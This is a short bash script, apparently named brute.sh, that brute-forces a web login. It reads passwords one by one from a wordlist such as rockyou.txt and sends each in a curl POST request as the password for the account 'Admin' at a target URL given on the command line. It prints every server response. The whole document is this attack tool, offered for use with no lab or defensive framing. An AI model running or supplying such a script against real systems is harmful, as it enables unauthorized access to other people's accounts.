#!/bin/bash

#usage: ./brute.sh https://vuln.com/login /usr/share/wordlists/rockyou.txt


target=$1 #accept host and login endpoint from user(complete URL)
wlist=$2 #accept wordlist path from user

while read -r pass
do
	echo "Attempting password: '$pass'"
	output=$(curl -X POST "$1" --header "Content-Type:application/json" --data '{"username":"Admin","password":"'$pass'"}')
	echo $output
done < $2